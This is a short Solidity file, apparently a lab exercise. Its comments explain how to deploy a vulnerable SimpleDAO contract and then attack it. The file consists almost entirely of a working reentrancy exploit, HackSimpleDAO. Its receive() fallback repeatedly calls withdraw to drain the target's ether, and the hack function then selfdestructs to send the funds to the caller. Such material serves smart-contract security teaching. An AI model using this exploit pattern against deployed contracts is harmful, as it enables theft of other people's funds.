pragma solidity ^0.6.0;

// First, deploy SimpleDAO contract and deposit some amount. Let's say 10 ETH
// Deploy HackSimpleDAO contract with some value
// Copy SimpleDAO contract address and use as a parameter to the function hack
// I will do reentrency until SimpleDAO balance is less than 1 ETH

interface SimpleDAOInterface {
    function deposit() external payable;

    function withdraw(uint256 amount) external;
}


contract HackSimpleDAO {
    address simpleDAOAddr;

    constructor() public payable {}

    function hack(address addr) public payable {
        simpleDAOAddr = addr;

        SimpleDAOInterface sd = SimpleDAOInterface(simpleDAOAddr);
        sd.deposit.value(1 ether)();
        sd.withdraw(1 ether);

        selfdestruct(msg.sender);
    }

    receive() external payable {
        uint256 balance = simpleDAOAddr.balance;
        if (balance == 0) return;
        if (balance > 1 ether) balance = 1 ether;
        SimpleDAOInterface sd = SimpleDAOInterface(simpleDAOAddr);
        sd.withdraw(balance);
    }
}
